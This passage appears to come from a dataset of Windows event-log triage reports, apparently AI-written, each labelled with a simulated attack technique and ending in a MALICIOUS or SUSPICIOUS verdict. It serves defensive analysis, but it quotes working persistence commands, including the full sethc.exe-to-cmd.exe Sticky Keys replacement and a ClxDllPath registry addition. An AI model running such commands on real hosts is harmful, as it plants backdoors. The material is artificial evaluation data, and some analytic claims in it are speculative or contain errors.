   - Consider restoring affected systems to a known good backup to remove any backdoors or persistent threats.

5. **Communication and Reporting:**
   - Inform the incident response team to take further steps in analysis and recovery.
   - Prepare documentation of this incident for long-term security reviews and preventive measures. 

These combined actions should help secure the system from the current incident and prevent similar future occurrences."
Replace binary of sticky keys,"Based on the investigation of provided Windows event logs, here are the significant findings:

1. **Command Execution & Privilege Escalation through Command Prompt (cmd.exe):**
   - There is an execution of `cmd.exe` with a complex command set targeting the `sethc.exe`:
     ```
     ""cmd.exe"" /c IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\sethc.exe /A & icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
     ```
   - This sequence attempts to:
     - Make a backup of `sethc.exe`.
     - Change ownership and permissions on `sethc.exe`.
     - Replace `sethc.exe` with `cmd.exe`.
   - The above actions are indicative of a common privilege escalation technique using the ""Sticky Keys"" exploit, which replaces the `sethc.exe` file to gain elevated command prompt access.

2. **Process Integrity and Execution:**
   - Processes like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are running under `SERVER002\admin_test` with a `High` integrity level, but these are fairly benign in nature if used alone.
   - Multiple instances of `MicrosoftEdgeUpdate.exe` are observed, which is normal behavior for Edge updating itself but should be checked if originating from legitimate Microsoft servers.

3. **Security Log:**
   - No notable items indicating a change or manipulation were recorded.

4. **System Log:**
   - Normal Windows updates are logged, which doesn't indicate any malicious activity.
  
5. **Application Log & Edge Updates:**
   - Entries show Edge update services starting and stopping, suggesting routine maintenance or updates.

**Assessment:**
- The presence of the command executed through `cmd.exe` is highly suspicious, particularly due to its association with privilege escalation tactics.
- There are no other entries reinforcing possible benign activities for the `cmd.exe` commands, raising concerns about unauthorized access attempts.

**Resolution: MALICIOUS**
- Guidance: 
  - Immediately check critical system files (`sethc.exe`) integrity and replace with correct versions if necessary.
  - Investigate any unauthorized changes to user privileges and revert them.
  - Conduct a thorough security review of logs for potential unauthorized access.
  - Review system access protocols and reinforce user training on potential insider threats.
  - Ensure security updates are applied, and antivirus definitions are up-to-date."
Code Executed Via Excel Add-in File (XLL),"Upon reviewing the provided logs, several activities stand out that could indicate either benign or potentially suspicious behavior. Let's break down these observations to assess the nature of the activity:

1. **Security Log Entries**:
    - The log entries with EventID 4624 indicate a successful logon session. Specifically, `LogonType` 5 indicates a service-type logon, suggesting that a service started up. The user context here is the `SYSTEM` account, which is standard for system services.
    - Multiple instances of EventID 4672, which logs special privileges assigned to new logons, are recorded shortly after the logons. This shows standard privileges necessary for the operation of services running under the SYSTEM user.
    - There are frequent EventIDs 4798, which indicate a query on user groups for users like 'Administrator', 'admin_test', etc. This is generally normal when confirming security contexts for certain operations or services.

2. **Sysmon Log Entries**:
    - The execution of `powershell.exe` by `SERVER002\\admin_test` is noted. The command line involves loading an Excel XLL add-in, which could potentially be benign if authorized, as it is often used for automation. However, such activity should be verified.
    - There are numerous entries involving processes like `wevtutil.exe` and `conhost.exe` being executed by 'admin_test'. The use of `wevtutil.exe`, typically used for event log management, should be checked to ensure it's for legitimate purposes.
    - Other observed processes like `MicrosoftEdgeUpdate.exe` operating under `NT AUTHORITY\SYSTEM` are typical for system updates or scheduled tasks.

3. **Windows PowerShell Log Entries**:
    - The script registering Excel XLLs indicates automation or a task requiring Excel integration. While this is not inherently malicious, its purpose should be verified, especially considering the path is within a temporary location which may not be standard for production operations.

4. **Application Log Entries**:
    - The presence of entries reporting `Windows Defender, SECURITY_PRODUCT_STATE_ON` indicates that Defender is active and potentially providing some level of threat protection.
    - No direct indications of application errors or anomalies were observed in the logs provided.

**Assessment and Resolution**:
- Most activities logged here could be categorically benign when considering a system undergoing updates, services starting, or administrative tasks.
- The use of `powershell.exe` to interact with Excel XLLs using a non-standard path is the most notable event, leaning towards suspicious, especially without context.
- The regular query events on user group membership and system services starting/stopping are typical for a system in operation, likely benign.
  
**Final Resolution**:
- **SUSPICIOUS**: The activity involving PowerShell and Excel XLLs needs further verification to rule out unauthorized scripting. This should involve checking the source scripts or any additional context around their execution. If this matches expected administrative automation, the activity may be benign. Otherwise, ensure no other scripts or scheduled tasks are executing without proper oversight and authorization.

**Guidance**:
- Verify the legitimacy of the PowerShell scripts and the Excel add-in files, ensuring they are from a trusted source.
- Confirm with the IT/admin team about any automation tasks scheduled and verify permissions are adequately set.
- Monitor further for changes in system behavior or unexpected script execution.
- Employ security tools to monitor and log activity for potential anomaly detection over time."
Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,"### Detailed Analysis of the Logs:

1. **Sysmon Logs**:
   - **PowerShell Activity**: Multiple Sysmon Event IDs of 1 and 5 indicate PowerShell execution. The CommandLine shows a detailed script running, which involves:
     - Modifying the Windows registry to allow VBA project access in Word.
     - Creating or modifying system registry keys.
     - Writing operations that create flag files if certain conditions are met.
     - Running VBA macros in Microsoft Word to schedule tasks (potential persistence mechanism).
   - **Processes**:
     - Instances of execution for `wevtutil.exe`, which is used to interact with Windows Event Logs, and could potentially clear or alter logs malignantly.
     - Frequent spikes of `conhost.exe`, commonly associated with console window operations, but suspicious if executed systematically as a byproduct of other scripts.
   
2. **PowerShell Logs**:
   - Reflects execution of a complex PowerShell script, derived from the Sysmon logs. This script attempts to add a type using a potentially missing assembly (`Microsoft.Office.Interop.Word`), create scheduled tasks, and modify registry settings.

3. **Application Logs**:
   - Several notices that the Edge Update service stopped multiple times. This might be normal behavior but combined with other activities, should be scrutinized for backdoor installations or policy circumventions.

4. **Lack of Logs**:
    - The absence of additional security or system logs may imply plausible tampering or evasion attempts potentially concealed within other log files.

### Assessment of the Situation:

- **Potential Security Risks**: The script's capability to change registry settings and create persistent tasks creates a significant risk of unauthorized control or continuation of action even after reboots. For instance, a scheduled task to open Calculator daily seems innocuous but demonstrates the system's receptivity to external script modifications.
- **Malicious Indicators**: The given scenario strongly indicates a compromise:
  - Script attempts to persist configuration changes (e.g., registry and templates).
  - Attempts to integrate VBA and Word automation script, typical in macro-based attacks.
  - Absence of required libraries, indicating potential staging or environments set up for further actions.

### Guidance and Resolutions:

The logs present strong indicators of suspicious and potentially malicious activity. The PowerShell commands executed suggest an attempt to manipulate the system's behavior for persistence and automation of tasks, possibly with a malicious intent.

**Resolution**: **MALICIOUS**

### Recommended Actions:

1. **Immediate Containment**: Disconnect the affected machine from the network to prevent further propagation or communication with potential command and control servers.
2. **Audit and Mitigation**: 
   - Conduct thorough scans for any malicious files or scripts left on the system.
   - Review the scheduled tasks for any unexpected entries and validate their necessity and authenticity.
3. **Investigate User Accounts**: Account `admin_test` seems heavily involved; ensure accounts are legitimate, not compromised, and credentials (if applicable) are reset.
4. **System Hardening**:
   - Enforce stringent PowerShell execution policies and enable all logging features in PowerShell.
   - Implement solutions like AppLocker to restrict unauthorized script execution.
5. **Post-Incident Response**:
   - Review and clean registry keys modified by the scripts.
   - Reaffirm endpoint protections and introduce enhanced monitoring for early detection of similar attempts in the future.

Engage forensic expertise if malicious activity impacts more critical systems or requires deep-dive analysis."
Simulate Patching termsrv.dll,"Upon reviewing the provided logs, I have identified certain events indicative of potentially malicious activities. Below is a detailed analysis based on the logs.

### Analysis of Logs

1. **Sysmon Logs:**
   - The execution of **PowerShell** with extensive privileges is observed:
     - **EventID 1** logged the execution of `powershell.exe` with a command line that modifies permissions on `termsrv.dll`, sets new access controls, and illicitly manipulates the file using administrative-level Access Control Lists (ACL). Such actions are typically indicative of attempts to backdoor or overwrite critical Windows service files.
     - The command includes copying the `termsrv.dll` file and modifying it, which is often associated with attempts to tamper with Remote Desktop functionalities.
   - Multiple instances of processes like **HOSTNAME.EXE**, **WHOAMI.EXE**, and **conhost.exe** used, likely to enumerate the environment or disguise under typical usage.

2. **Security Logs:**
   - The presence of **EventID 4672** corresponds to special privileges assigned to the `admin_test` user session. The privileges such as `SeDebugPrivilege` can allow users to access sensitive system-level information and operations.
   - **EventID 4624** logs frequent logons via NTLM, paired with `LogonType 3` (network), which might indicate remote, potentially unauthorized access.
   - **EventID 4907** logs security descriptors modification on `termsrv.dll`, in line with Sysmon's PowerShell activity, reinforcing possible malicious tampering.

3. **PowerShell Logs:**
   - Documented start and execution of PowerShell sessions that directly align with the `termsrv.dll` manipulations. The control over the DLL and backing up/restoration suggests preparations to evade security checks and maintain persistence.

4. **System Logs:**
   - **EventID 1** in the Kernel-General log hints at suspicious time adjustments. Time skewing by malicious actors is often performed to cover traces or manipulate logs.

5. **Application Logs:**
   - Software Protection Platform logs (`sppsvc.exe`) were standard, suggesting no immediate tampering in these specific entries. 

### Assessment

- The observed behavior, particularly the use of PowerShell to alter a critical system file, `termsrv.dll`, suggests an unauthorized modification attempt, likely to modify RDP settings or facilitate a backdoor.
- The user `admin_test` with elevated privileges, in conjunction with these activities, suggests an internal or compromised access account.

### Resolution

- **MALICIOUS:** The identified activities, including unauthorized file modifications, administrative privilege usage, and manipulated security descriptors, strongly indicate malicious compromise.

### Guidance on How to Proceed

1. **Immediate Isolation:** Isolate `Server002` from the network to contain the potential threat.
2. **File Integrity Checks:** Verify the integrity of `termsrv.dll` and other critical system files against known good baselines.
3. **User Account Review:** Audit `admin_test` and any correlated user accounts for unauthorized access or attempts at privilege escalation.
4. **Log Review:** Conduct an extended log analysis to confirm entry points, persistence mechanisms, or lateral movement.
5. **Security Controls:** Enhance monitoring of PowerShell usage and incorporate real-time alerts for sensitive system file access and modifications.
6. **Incident Report:** Compile into a comprehensive incident report and disclosure to management and relevant stakeholders, and prepare for potential communication to affected clients or partners if data is at risk."
Install and Register Password Filter DLL,"### Analysis:

Upon reviewing the provided logs, several indicators of potentially malicious activity have been identified:

1. **Windows PowerShell Logs:**
   - There are PowerShell commands executed that interact with the Windows registry and system files in a way that resembles potential malicious behavior.
   - Example command: copying a DLL to `C:\Windows\System32` and modifying registry keys related to `Notification Packages`. This could indicate attempts to install a malicious password filter DLL, often associated with credential theft techniques.

2. **Sysmon Logs:**
   - The PowerShell script execution (event ID 1) shows registry and file system alterations consistent with attempts to establish persistence or circumvent security measures.
   - The executable `filePWFilter.dll` in the command suggests a strategy to hook or manipulate password processes which can be a significant security concern.

3. **Frequent Service Interactions:**
   - Numerous interactions with `Microsoft Edge Update` processes without interactive user activity might suggest an automated script or malware behavior trying to leverage these processes for persistence or update hijacking.

4. **Logon Events:**
   - Several successful logons by `SYSTEM` indicate potential privilege escalation or the exploitation of system-level permissions, especially demonstrated by the repetitive use of privilege rights as captured in event ID 4672.

### Assessment of Situation:

The behavior observed in the logs indicates a high likelihood of malicious activity:

- The use of PowerShell to change registry entries and copy potentially malicious files into system directories is often a sign of an attack leveraging living-off-the-land binaries (LOLBins).
- The process interactions largely appear normal except for the PowerShell actions which point towards an advanced persistent threat (APT) behavior or a specific malware family utilizing system features for persistence.

### Threats or Risks Identified:

- **Credential Theft:** The modification of registry settings related to `Notification Packages` is directly tied with attempts to intercept or manipulate credentials.
- **Persistence Mechanisms:** Copying DLLs to critical system directories is a technique used to ensure persistence across reboots.
- **Privileged Actions:** Use of SYSTEM-level privileges and modification of security-critical registry entries imply an advanced threat actor or malware with elevated access.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent lateral movement or data exfiltration.
   - Conduct a system integrity check to verify the DLLs and registry settings' authenticity and any tampering.

2. **Forensic Analysis:**
   - Perform a deep-forensic analysis on file changes, registry modifications, and an audit trail of executed commands.
   - Analyze network traffic for any anomalies post initial registry modifications to capture any outbound communication attempts.

3. **Mitigation Steps:**
   - Restore the system to a known good state from backups, focusing on pre-incident states.
   - Update all security solutions including antivirus and endpoint protection with the latest signatures and patches.

4. **Security Hardening:**
   - Implement stricter PowerShell script execution policies, potentially moving to Constrained Language Mode.
   - Ensure the least privilege principle is enforced across the network, particularly for accounts used in automation or high-privilege tasks.

### Resolution:

**MALICIOUS** - The provided logs contain clear evidence of suspicious activities (registry manipulation, potential credential theft techniques) that strongly suggest malicious intent. Immediate action is necessary to prevent further compromise."
Application Shim Installation,"Upon reviewing the provided Windows event logs from the Windows host, I will conduct an analysis to identify any suspicious or malicious activities.

### Analysis:

1. **Sysmon Events:**
   - **Events of Interest:** The logs reveal that multiple processes were executed by the user `SERVER002\admin_test`. Notably:
     - `powershell.exe`
     - `wevtutil.exe`
     - `cmd.exe` executing `sdbinst.exe`
     - `sdbinst.exe` executed from a temporary directory.
   - `powershell.exe` is commonly used by attackers for script execution. However, there's no command-line detail to assess the context of this execution.
   - The execution of `wevtutil.exe` can be indicative of log manipulation given its capability to manage Windows Event logs.
   - The command executed by `cmd.exe`: `cmd.exe /c sdbinst.exe ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\fileShimx86.sdb""`. The execution of `sdbinst.exe` from a temporary directory is unusual and could suggest an attempt to install or manage application compatibility databases, possibly as a persistence mechanism.
   
2. **Edge Update Activity:**
   - Multiple entries show execution of Microsoft Edge Update processes under `NT AUTHORITY\SYSTEM`, which in itself looks normal as these are related to system updates for Microsoft Edge.
   - The logs do not show unusual modification parameters or time patterns for these processes.

3. **Application Logs:**
   - The logs reflect service stop events from `edgeupdate`, which aligns with typical update behavior.
   - No relevant alerts or warnings relating to software changes or errors were logged in the application channel.

4. **Lack of Context in System, Security, and PowerShell Logs:**
   - The absence of logs in these sections limits correlation and deeper assessment for unusually privileged operations or failed logon attempts.
   
### Conclusion:
- **Suspicious Behavior:**
  - The `wevtutil.exe` and `sdbinst.exe` processes suggest potential tampering or malicious setup efforts, particularly in tandem with the generic nature and location of executables.
  - The usage of `cmd.exe` to execute `sdbinst.exe` from a temporary folder hints at potential risky behavior, as it can signify an attempt to execute or install a temporary application compatibility database which could be leveraged for persistence or manipulation.

### Assessment:
Based on the observations above, the actions involving `cmd.exe`, `wevtutil.exe`, and `sdbinst.exe` warrant further investigation. While not all activities are explicitly malicious, the use of these processes requires a closer look due to their potential misuse in cyber intrusions.

### Recommended Resolution:
- **SUSPICIOUS** - The logs contain activities that could indicate potentially malicious actions, although further analysis and context are needed to confirm any specific threats.

### Guidance:
- Conduct further investigation on the command-line actions and user activity associated with these suspicious processes.
- Verify the integrity and origin of operations performed by `SERVER002\admin_test`.
- Check for additional logs or system behavior changes around the time of the suspicious operations to confirm if any configurations were altered.
- Continue monitoring for similar events to detect potential patterns."
WMI Invoke-CimMethod Start Process,"Upon analyzing the provided Windows event logs, several entries merit attention:

1. **Time Change Events (Event ID 4616)**:
   - There are multiple instances of system time being altered closely together. Time changes can be legitimate but can also be a tactic employed by attackers to cover their tracks or to align with the timing of certain malicious activities. Here, the time was set back from ""2024-10-27 13:12:55.2298304"" to ""2024-10-27 13:12:47.3626953"". The time manipulation is a classic indication of suspicious activity that needs further scrutiny.

2. **Administrative Privilege Use (Event ID 4672)**:
   - The ""admin_test"" account was granted a range of privileges, including SeDebugPrivilege and SeTakeOwnershipPrivilege, which are powerful permissions that can be exploited for malicious purposes. Although such actions can occur in legitimate administrative scenarios, they require careful examination, especially under suspicious contexts.

3. **Network Logon and Command Execution (Event ID 4624)**:
   - A Logon Type 3 (network logon) is recorded for the ""admin_test"" user from a remote desktop machine ""DESKTOP-3HL5B2P"" using the NTLM protocol. This action resembles common patterns of lateral movement or attempts to connect externally, which could indicate an initial stage of compromise.

4. **Use of PowerShell (Sysmon Event ID 1, PowerShell Event Logs)**:
   - A PowerShell script executed a remote CIM session on localhost using administrator credentials to launch ""calc.exe"". The use of PowerShell in such a manner, especially with administrative credentials, could potentially hint at script-based attack mechanisms or automated tasks running without clear documentation.

5. **Process Execution with Administrative User (Sysmon Event ID 5)**:
   - Multiple instances of process creations, notably ""wevtutil.exe"" (a utility used to manage Windows event logs) running under the ""admin_test"" user account, raises questions about log manipulation or data extraction attempts.

**Assessment:**
The event logs reveal patterns that align with potentially malicious behavior, such as time modifications, extensive use of privileged commands, unexplained remote sessions, and the execution of PowerShell scripts in what appears to be an automated administrative context. Although each event individually might have benign explanations, collectively they exhibit signs consistent with malicious activities or a compromised environment where further investigation is necessary.

**Resolution**: **SUSPICIOUS**  
There is enough evidence to deem the actions recorded as suspicious. It is prudent to conduct a deeper forensic investigation into the intent behind the time changes, privileged actions, and remote command executions. Additional context from network logs, user activity, and system integrity checks should be gathered to conclude whether the ""admin_test"" account was used internally or by an unauthorized entity."
Create registry persistence via AppCert DLL,"### Analysis of Windows Event Logs

#### **Suspicious and Anomalous Behavior**

1. **Suspicion of Potential DLL Side-loading via Registry Modification:**
   - **EventID 1 (Sysmon):** A PowerShell script executed by the user `SERVER002\admin_test` is attempting to copy a file named `fileTest.dll` to `C:\Users\Public\fileTest.dll` and adds a registry entry under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls` with a specific DLL (fileTest) pointing to this copied DLL. Such actions can indicate attempts to perform DLL side-loading, a known method to hijack legitimate processes to load malicious code.
   - **Command-line in PowerShell log:** The command line used involves actions like file copying, registry modifications, and usage of PowerShell, which are not typical actions in normal operation environments unless during an update or recovery procedure with legitimate oversight.

2. **Frequent Use of `conhost.exe` and `wevtutil.exe` by the same user:**
   - The execution of `conhost.exe` and `wevtutil.exe` multiple times (as seen in multiple EventID 5 logs with minimal time difference) can be symptomatic of malicious activities. These processes may be used in an attempt to obfuscate logs or perform unauthorized actions, making it a red flag when occurring in rapid succession, specifically under atypical circumstances.

3. **Potential Privilege Escalation:**
   - **Integrity Level: High** on several processes run by `admin_test` with the suspicious command lines and registry keys being modified indicates potential privilege exploitation to maintain or gain higher authority on the machine.

#### **Potential Malicious Activity Indicators**

- The sequence of activities involving PowerShell executions, registry modification, and particularly unconventional paths for the DLL being inserted into registry keys suggests attempts to establish persistence or stealthy payload execution.
- The execution patterns are inconsistent with regular administrative tasks, particularly due to the presence of command lines indicating copying and registry manipulation without context or further justification.
- The activities occur in the context of a user account (`admin_test`) that could hint at a compromised account being utilized for malicious objectives.

### Assessment

**Resolution:** **MALICIOUS**

- The logs present clear indicators of potential malicious activity characterized by registry key alterations (specifically AppCertDlls), file copying of a DLL without standard system usage explanations, and the invocation of PowerShell scripts which could facilitate further unauthorized system modifications.
 
### Guidance on Proceeding

1. **Immediate Actions:**
   - Disconnect the host (Server002) from the network to prevent further malicious activity or lateral movement.
   - Investigate the account `admin_test` for potential compromise and unauthorized access history.
   - Verify the integrity and source of the `fileTest.dll` mentioned in the logs.
   - Examine additional security logs for further signs of perimeter security bypass or lateral movements.

2. **Recommendations:**
   - Conduct a full malware scan of the affected machine and connected network devices.
   - Review access permissions and policies to enforce least privilege measures.
   - Implement enhanced monitoring and detailed logging of PowerShell activities and registry changes.
   - Consider a full recovery from recent backups if removal of the threat is not feasible through disinfection.

By addressing the highlighted suspicious activities and enhancing security protocols, potential malicious ramifications can be minimized and controlled moving forward."
Persistence via WMI Event Subscription - CommandLineEventConsumer,"After reviewing the provided logs, the following analysis points were identified:

### 1. **System Log Analysis:**
- The events indicate a series of time adjustments performed by svchost.exe, which is commonly used for legitimate system operations. The time changes appear minor and consistent with normal operations such as time synchronization with `time.windows.com`.

### 2. **Security Log Analysis:**
- Event ID 4624 indicates successful logons, specifically for the SYSTEM account via a service logon, which is typical for services running system-level tasks.
- Event ID 4672 shows high-level privileges assigned, which is expected for the SYSTEM account's activities.
- The event IDs of 4616 regarding time changes correspond with system clock adjustments, consistent with the system logs.

### 3. **Windows PowerShell Log Analysis:**
- PowerShell logs reveal the execution of a script involving WMI event consumer configurations. The script is setting up an event filter and an event consumer with a command to run `notepad.exe`.
- While the use of WMI for persistence could be malicious (as it’s a known tactic for maintaining access), the specific command being executed (`notepad.exe`) is benign. However, configuring it via PowerShell could indicate test or a benign administrative task.

### 4. **Application Log Analysis:**
- Events related to Microsoft Edge Update, which are regular system update activities, are noted. They aren't usually indicative of malicious behavior.

### 5. **Sysmon Log Analysis:**
- The process creations logged by Sysmon for common administrative applications like `whoami`, `conhost`, `hostname`, and notably WMI and Edge Update processes, don't inherently suggest malicious activity. 
- Although the frequency and timing of these executions suggest automated or scripted actions, they seem to align with regular system processes and update activities.

### **Assessment & Resolution:**

Despite certain activities resembling techniques used in persistence strategies (like the PowerShell operation with WMI), the specifics of the commands and executables involved (notepad.exe) do not commonly indicate malicious intent, especially in an enterprise setting where such frameworks might be leveraged for monitoring or administrative automation.

Based on the information provided:
- **Resolution**: **SUSPICIOUS**
- **Reason**: The utilization of PowerShell for setting up WMI subscriptions is notable due to its potential misuse for persistence. While the current command itself is not harmful, the activity merits further review to ensure it’s within the expected range of administrative tasks or test actions. There are no immediate signs of a compromise because the actions observed could easily align with benign administrative activities, but further investigation into the intent and context of these configurations should be considered to rule out the possibility of preparatory stages of a stealthy persistence mechanism."
New shim database files created in the default shim database directory,"Based on the provided Windows event logs, here is the detailed analysis of the suspicious activities identified:

### PowerShell Logs Analysis
1. **PowerShell Execution:**
   - The logs show that PowerShell was used to execute commands to copy a file, `data.011CompatDatabase.sdb`, from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\`) to system directories (`C:\Windows\apppatch\Custom\` and `C:\Windows\apppatch\Custom\Custom64\`).
   - This behavior is suspicious because copying files to system directories, especially from temporary locations, can indicate an attempt to persist malicious software or manipulate the system configuration, which could facilitate a compromise.

### Sysmon Logs Analysis
1. **Process Execution:**
   - There were several key processes executed around the same time as the PowerShell command:
     - `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe`. These are typically benign and used for system queries and operations.
     - `wevtutil.exe` was used with a command to export logs, which could be a legitimate administrative act or an act to cover tracks by exporting current logs.
   - **Microsoft Edge Update Installation:**
     - The logs show a legitimate software update process involving Microsoft Edge. This is a system-level activity, and the presence of `NT AUTHORITY\SYSTEM` as the user executing these processes is standard for system updates.

### General Observations
- The behavior of using PowerShell to copy files to critical system areas and the subsequent use of utilities like `wevtutil.exe` and `whoami.exe` can be indicative of malicious activity, particularly if combined with actions to obfuscate or alter system logs.
- Conversely, some of the entries like `Microsoft Edge Installer` activity and `wevtutil.exe` used for exporting logs could be typically benign and associated with regular system updates or administrative tasks.

### Risk Assessment
- The observed PowerShell activity of copying files from a temporary user directory to system directories is unconventional as per standard operations, which raises suspicion.
- The subsequent execution of several system utilities shortly after the PowerShell activity suggests a potential preparatory stage or cleanup operation, further aligned with possible malicious intent.

### Resolution
Given the context of the activities, while there are benign elements such as system updates, the use of PowerShell in this manner, in concatenation with system utilities, suggests unusual behavior that can often be associated with advanced persistence threats or initial compromise attempts.

**Resolution: SUSPICIOUS**

### Action Items
- **Deeper Inspection:** Conduct a more thorough investigation into user activities and file origins in `C:\Users\ADMIN_~1\AppData\Local\Temp\`.
- **Integrity Verification:** Verify the integrity and source of the copied files `data.011CompatDatabase.sdb`.
- **Log Analysis:** Monitor and inspect logs for any further suspicious activity, especially around PowerShell usage and changes to the system directories.
- **System Scans:** Run comprehensive antivirus and malware detection scans on the involved systems.
- **User Investigation:** Examine the user's recent activities, `SERVER002\\admin_test`, to ensure there is no insider threat or account compromise. 

This additional investigation will help ascertain whether this activity could be part of larger malicious behavior, or an isolated incident with a plausible benign explanation."
Load custom DLL on mstsc execution,"Based on the analysis of the provided Windows event logs, here is the detailed assessment:

### System Log Analysis
- The system logs mostly record time adjustments made by the `svchost.exe` process, indicating normal system operations related to time synchronization. This does not present any immediate indication of malicious activity.

### Sysmon Log Analysis
- Multiple processes such as `whoami.exe`, `hostname.exe`, and `conhost.exe` were executed by the `SERVER002\admin_test` user. These operations were performed under High integrity levels, which can be linked to normal administrative tasks if executed by an authorized user.
- However, there is a notably suspicious command execution involving `cmd.exe` executing a registry modification: `""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Terminal Server Client"" /v ClxDllPath /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f`. The addition of a registry entry related to DLL path is a common persistence mechanism used by attackers. While `am_si.dll` is a legitimate file related to AMSI (Antimalware Scan Interface), the action of modifing the registry can also be associated with attempt to bypass AMSI or alter its behavior.
- The frequent execution of `wevtutil.exe` which is a tool that manages Windows event logs can be seen as normal administrative activity, but if done without reason, it could indicate log tampering attempts which need further investigation.
- `Microsoft Edge Update` processes were frequently executed by the `SYSTEM` user, indicating standard software update activity, which seems benign based on typical system behavior.

### Application Log Analysis
- Logs show the termination of services related to Microsoft Edge updates, aligning with typical application update behavior.

### Security Log Analysis
- Security logs capture time changes in the system which match the entries in the system log. These logs appear consistent with system maintenance actions.

### Conclusion
The execution of commands via `cmd.exe` to modify registry entries related to the Terminal Server Client is concerning, resembling a technique often associated with malware persistence. However, without additional context, such as whether these actions were indeed authorized or coincide with suspicious access times or sources, it warrants careful investigation.

### Final Assessment
- **Resolution: SUSPICIOUS**
- **Recommendation**: Further investigation is required to confirm the legitimacy of the `cmd.exe` activity modifying registry entries and to ensure it aligns with authorized administrative actions. Additionally, check for any unauthorized access or presence of malicious files associated with the registry changes. Conduct a user behavior analysis to verify the legitimacy of tasks carried out under the `SERVER002\admin_test` user account.
"
Bitsadmin Download (PowerShell),"Upon analyzing the provided log entries from the Windows host, the following points of interest and suspicious activities were identified:

1. **PowerShell Activity**:
   - The PowerShell logs show that a BitsTransfer command is executed using the `Start-BitsTransfer` cmdlet, which downloads a file from a GitHub repository to a temporary folder. The file downloaded is `data.md`, which is placed in `$env:TEMP\\bitsadmin2_flag.ps1`.
   - This command is suspicious as it uses PowerShell to download a script from a remote source, potentially indicating an attempt to execute a script that could perform further actions on the system. This aligns with common tactics used in malicious behavior to fetch and execute payloads.

2. **Sysmon Logs**:
   - Numerous entries involve execution of Microsoft Edge Update components (`MicrosoftEdgeUpdate.exe` and associated files). While the updates themselves might be benign, the consistent activity in a short timespan can be an attempt to execute or disguise malicious software under the guise of a legitimate application. However, no direct malicious actions (like an uncommon network connection or abnormal process behavior) are logged.
   - Frequent execution of system utilities such as `wevtutil.exe` and `conhost.exe` associated with the same user (`SERVER002\\admin_test`) can be typical, but when combined with the PowerShell activity, it raises suspicion.
   - Processes like `whoami.exe` and `hostname.exe` executions may be used for reconnaissance purposes and part of a larger attack chain.

3. **Application Logs**:
   - The entries related to services stopping (`edgeupdate`) do not clearly indicate any malicious activity on their own, but they add to the comprehensive evaluation of unusual behavior surrounding the system at this time.

**Assessment**:
- Given the evidence from the logs, primarily focusing on the PowerShell activity, there is a strong indication of a potential compromise through script-based attacks using remote resources.

**Threats/Risks**:
- Possible execution of malicious payloads fetched via PowerShell using `Start-BitsTransfer`.
- Unauthorized script execution leading to potential data exfiltration, further compromise of the host or network.

**Guidance**:
- Immediate containment measures, including isolating the machine from the network, are advised.
- Further forensic analysis should be conducted on the machine to uncover additional indicators of compromise or persistence mechanisms.
- Review the sourced `data.md` script for malicious intent or secondary payloads.
- Change any credentials that might have been exposed or used in the session.

**Resolution**:
- **MALICIOUS** - The logs contain activities indicative of a malicious attempt to compromise the system using remote script execution."
Install AppInit Shim,"After analyzing the provided logs, the following observations can be made:

**Analysis of Security and Sysmon Logs:**

1. **Multiple Logon Events (4624) and Privileged Account (4672):**
   - There are several logins with Event ID 4624 (indicating successful logons using the SYSTEM account) and Event ID 4672, which indicates special privileges were assigned. While these activities could be legitimate, they are typically of interest as they may indicate suspicious activity if seen excessively or out of the ordinary.

2. **Usage of WindowsPowerShell (Sysmon Event ID 5):**
   - **Process Image:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` executed by the user ""admin_test"". 
   - Any execution of PowerShell should be scrutinized, especially by non-admin accounts or without a clear reason, however, there are no command-line arguments present in the logs that would indicate malicious intent.

3. **Suspicious Execution of `wevtutil.exe` (Sysmon Event ID 5):**
   - Multiple instances of `C:\Windows\System32\wevtutil.exe`, a tool used to query and modify event logs, are recorded. Frequent use of this tool can indicate activities to clear logs or tamper evidence.

4. **Suspicious `cmd.exe` Usage for Registry Import:**
   - Command: `cmd.exe /c reg.exe import ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\src\data.010.reg""`
   - The use of the command prompt to import registry files can be part of malicious activity to alter system behavior or persistence mechanisms.

5. **Misleading Exec Paths - `MicrosoftEdgeUpdate.exe`:**
   - The frequent execution of `MicrosoftEdgeUpdate.exe` from scheduled tasks and its temporary directory indicate it might be a benign update behavior. However, stacked logs of similar exec paths with variant changes in legitimate application paths (temp directory) could suggest unusual behavior.

6. **Credential Validation Events (Event ID 5379):**
   - Several credential validation attempts fail (ReturnCode 3221226021 indicates a failure). This event is normal if the user is having issues logging in but repeated attempts can indicate password-spraying attacks.

**Conclusion:**

The logs reflect a mix of common and potentially anomalous activities:
- Use of PowerShell and registry modification are activities worth monitoring as they can be used for lateral movement or maintaining persistence if conducted with malicious intent.
- Credential validation failures and excessive wevtutil usage may reflect an attempt to manipulate logs or unauthorized access attempts.
- While the Edge Update process seems legitimate, the use of temp directory paths needs verification for legitimacy.

**Verdict:** SUSPICIOUS

Given the repetitive pattern of potential misuse of command-line tools typically leveraged in compromise strategies (PowerShell, cmd.exe for registry import), and potential log clearing activities, the logs warrant further investigation. It is advised to cross-check user activities, verify the legitimacy of processes executed, and escalate if necessary to conduct a more thorough forensic analysis on the system."
Persistent Code Execution Via Excel Add-in File (XLL),"Upon analyzing the provided Windows event logs, I discern the following key points:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution:**
   - **Analysis:** 
     The logs reveal multiple entries related to the execution of a PowerShell script that interacts with the Excel COM object. The script attempts to check whether Microsoft Office is 32-bit or 64-bit and then copies a specific `.xll` (Excel Add-in) file to the user's `AddIns` folder. It modifies the Excel registry path to open the add-in and then launches Excel.
   - **Suspicion Indicators:**
